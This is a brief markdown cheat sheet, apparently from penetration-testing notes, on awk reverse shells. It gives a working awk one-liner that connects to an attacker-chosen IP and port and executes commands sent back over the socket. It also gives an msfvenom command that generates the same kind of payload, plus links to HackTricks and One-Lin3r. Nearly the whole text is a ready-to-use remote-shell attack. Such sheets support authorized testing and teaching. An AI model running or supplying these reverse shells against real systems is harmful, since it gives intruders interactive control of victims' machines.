# Awk

## 01 - TCP Method

```
$ awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do { printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

## 02 - Generate via `msfvenom`

```
$ msfvenom -p cmd/unix/reverse_awk lhost=<IP> lport=<PORT>
```

---
## References

- [Hacktricks: Shells Linux](https://book.hacktricks.xyz/shells/shells/linux)

- [D4Vinci: One-Lin3r](https://github.com/D4Vinci/One-Lin3r)